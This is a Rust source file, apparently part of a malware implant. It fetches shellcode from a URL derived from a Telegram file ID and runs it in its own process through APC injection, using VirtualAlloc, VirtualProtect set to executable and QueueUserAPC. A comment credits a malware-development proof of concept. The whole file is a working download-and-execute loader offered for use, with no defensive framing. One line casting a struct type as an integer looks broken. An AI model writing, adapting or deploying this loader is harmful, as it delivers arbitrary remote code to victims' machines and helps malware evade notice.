
use std::ptr::{copy_nonoverlapping, null_mut};

use winapi::{
    ctypes::c_void,
    um::{
        errhandlingapi::GetLastError,
        memoryapi::{VirtualAlloc, VirtualProtect},
        processthreadsapi::{CreateThread, QueueUserAPC, ResumeThread},
        synchapi::{SleepEx, WaitForSingleObject},
    },
};


pub async fn inject_self_packet(file_id: &String,client:&reqwest::Client) -> bool {
    let download_url= crate::functions::tg_until::tg_tools::file_id_to_download_url(file_id.to_string(), client).await.0;
    println!("[debug] download_url: {}", download_url);
    let response = client.get(download_url).send().await.expect("下载文件失败");
    let shellcode= response.bytes().await.expect("获取 shellcode 失败");
    let shellcode1 :&[u8] = shellcode.as_ref();
    // println!("{:?}", shellcode.to_vec());
    // 使用一个新的线程
    println!("[debug] 开始注入 shellcode");
    let buf = shellcode1.to_vec();
    let _ = std::thread::spawn(move || {
        apc_self_inject(&buf);
    });
    // let _ = handle.join();
    // 检查重复注入的问题
    true
}


/*
    New Update APC Injection POC
    For more codes: https://github.com/Whitecat18/Rust-for-Malware-Development.git
    @5mukx
*/

// writing function call
unsafe extern "system" fn function(_content: *mut c_void) -> u32 {
    SleepEx(0xFFFFFFFF, 1);
    0
}



#[repr(transparent)]
#[allow(non_camel_case_types)]


pub struct THREAD_CREATION_FLAGS(pub u32);

macro_rules! okey {
    ($msg:expr, $($arg:expr) ,*) => {
        println!("\\____[+] {}", format!($msg, $($arg), *));
    }
}

macro_rules! error {
    ($msg:expr, $($arg:expr), *) => {
        println!("\\____[-] {}", format!($msg, $($arg), *));
        std::process::exit(0);      // 注入失败，退出程序
    }
}

fn apc_self_inject(shellcode:&[u8]) {
    let buf = shellcode.to_vec();

    unsafe {
        let h_thread = CreateThread(
            null_mut(),
            0,
            Some(function),
            null_mut(),
            THREAD_CREATION_FLAGS as u32, // or just 0 is enough !
            // 0,
            null_mut(),
        );

        if h_thread.is_null() {
            error!("Unable to create thread: {:?}", GetLastError());
        }

        okey!("Thread Address: {:?}", h_thread);

        let address = VirtualAlloc(null_mut(), buf.len(), 0x1000 | 0x2000, 0x04);

        okey!("Allocated Address: {:?}", address);

        copy_nonoverlapping(buf.as_ptr(), address as *mut u8, buf.len());

        let mut protect = 0;

        let virtual_protect = VirtualProtect(address, buf.len(), 0x40, &mut protect);

        if virtual_protect == 0 {
            error!("VirtualProtectEx failed : {:#?}", GetLastError());
        }

        QueueUserAPC(std::mem::transmute(address), h_thread, 0);

        ResumeThread(h_thread);
        WaitForSingleObject(h_thread, 0xFFFFFFFF);
    }
}